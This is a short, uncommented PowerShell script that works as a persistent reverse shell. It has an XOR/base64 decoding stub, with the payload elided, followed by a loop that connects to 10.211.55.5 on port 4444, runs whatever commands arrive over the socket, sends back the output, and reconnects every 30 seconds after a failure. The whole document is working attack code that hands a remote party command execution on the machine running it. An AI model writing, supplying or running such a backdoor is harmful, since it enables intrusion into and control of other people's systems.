
$k = 0xAA
$s = [System.Convert]::FromBase64String("...") 
$d = -join (($s | ForEach-Object { [char]($_ -bxor $k) }))


While($true) {
Try {
        
        $cl = [System.Reflection.Assembly]::LoadWithPartialName("System.Net.Sockets")
        $c = New-Object System.Net.Sockets.TCPClient("10.211.55.5", 4444)
        $st = $c.GetStream()
While($c.Connected) {
       
            $reader = New-Object System.IO.StreamReader($st)
            $writer = New-Object System.IO.StreamWriter($st)
            
            $cmd = $reader.ReadLine()
If($cmd) {
                
                $res = [powershell]::Create().AddScript($cmd).Invoke() | Out-String
                $writer.WriteLine($res)
                $writer.Flush()
            }
        }
    } catch {
       
        Start-Sleep -Seconds 30
    }
}
